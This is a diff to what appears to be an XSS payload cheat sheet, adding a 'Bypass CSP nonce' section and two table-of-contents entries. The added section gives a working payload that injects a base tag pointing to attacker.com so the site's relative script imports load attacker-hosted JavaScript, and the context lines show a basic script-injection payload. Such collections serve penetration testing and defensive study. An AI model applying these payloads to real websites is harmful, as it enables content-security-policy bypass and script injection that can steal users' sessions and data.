@@ -83,6 +83,8 @@
     - [Bypass CSP unsafe-inline](#bypass-csp-unsafe-inline)
     - [Bypass CSP script-src self](#bypass-csp-script-src-self)
     - [Bypass CSP script-src data](#bypass-csp-script-src-data)
+    - [Bypass CSP nonce](#bypass-csp-nonce)
+    - [Bypass CSP header sent by PHP](#bypass-csp-header-sent-by-php)
   - [References](#references)
 
 ## Vulnerability Details
@@ -1306,6 +1308,26 @@ Source: [@404death](https://twitter.com/404death/status/1191222237782659072)
 ```javascript
 "/><script>alert(1);</script>
 ```
+
+
+### Bypass CSP nonce
+
+**Requirements**:
+
+* CSP like `script-src 'nonce-RANDOM_NONCE'`
+* Imported JS file with a relative link: `<script src='/PATH.js'></script>`
+
+
+**Payload**:
+
+1. Inject a base tag.
+  ```html
+  <base href=http://www.attacker.com>
+  ```
+2. Host your custom js file at the same path that one of the website's script.
+  ```
+  http://www.attacker.com/PATH.js
+  ```
 
 
 ### Bypass CSP header sent by PHP
